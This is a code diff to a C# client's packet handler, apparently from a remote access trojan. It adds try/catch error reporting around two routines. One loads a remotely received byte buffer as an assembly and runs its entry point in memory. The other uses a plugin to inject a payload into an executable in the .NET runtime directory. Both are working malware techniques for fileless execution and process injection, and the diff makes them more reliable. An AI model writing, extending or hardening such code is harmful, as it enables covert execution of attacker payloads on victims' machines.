@@ -39,13 +39,20 @@ namespace Client.Handle_Packet
                 {
                     new Thread(delegate ()
                     {
-                        Assembly loader = Assembly.Load(buffer);
-                        object[] parm = null;
-                        if (loader.EntryPoint.GetParameters().Length > 0)
+                        try
                         {
-                            parm = new object[] { new string[] { null } };
+                            Assembly loader = Assembly.Load(buffer);
+                            object[] parm = null;
+                            if (loader.EntryPoint.GetParameters().Length > 0)
+                            {
+                                parm = new object[] { new string[] { null } };
+                            }
+                            loader.EntryPoint.Invoke(null, parm);
                         }
-                        loader.EntryPoint.Invoke(null, parm);
+                        catch (Exception ex)
+                        {
+                            Packet.Error(ex);
+                        }
                     })
                     { IsBackground = true }.Start();
 
@@ -54,9 +61,16 @@ namespace Client.Handle_Packet
                 {
                     new Thread(delegate ()
                     {
-                        Assembly loader = Assembly.Load(plugin);
-                        MethodInfo meth = loader.GetType("Plugin.Program").GetMethod("Run");
-                        meth.Invoke(null, new object[] { buffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection) });
+                        try
+                        {
+                            Assembly loader = Assembly.Load(plugin);
+                            MethodInfo meth = loader.GetType("Plugin.Program").GetMethod("Run");
+                            meth.Invoke(null, new object[] { buffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection) });
+                        }
+                        catch (Exception ex)
+                        {
+                            Packet.Error(ex);
+                        }
                     })
                     { IsBackground = true }.Start();
                 }
